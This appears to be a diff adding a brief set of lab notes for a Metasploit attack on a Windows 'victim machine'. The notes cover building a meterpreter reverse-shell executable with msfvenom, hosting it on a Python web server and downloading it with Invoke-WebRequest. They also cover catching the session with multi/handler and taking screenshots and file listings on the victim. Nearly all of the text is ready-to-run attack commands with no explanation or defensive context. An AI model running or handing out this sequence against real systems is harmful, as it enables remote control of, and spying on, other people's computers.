@@ -1,0 +1,35 @@
+----STARTING PAYLOAD-----
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.10.11 LPORT=4555 -f exe > payload.exe
+
+----STARTING HTTP SERVER-----
+python3 -m http.server 4555
+
+-----DOWNLOADING PAYLOAD ON VICTIM MACHINE----
+Invoke-webrequest -URI http://192.168.10.11
+
+----STARTING MSFCONSOLE----
+msfconsole
+
+-----SETTING UP HANDLER----
+use exploit/multi/handler
+
+-------SETTING PAYLOAD ARCHITECTURE-------
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+
+-------SETTING LHOST-------
+set LHOST 192.168.10.11
+-------SETTING LPORT-------
+set LPORT 4555
+
+-------SETTING EXIT CONDITION-------
+set ExitOnSession false
+
+-------EXECUTING PAYLOAD-------
+exploit -j
+
+-------Starting session-------
+sessions -i 1
+
+-------COMMANDS APPLIED ON VICTIM MACHINE-------
+screenshot
+ls
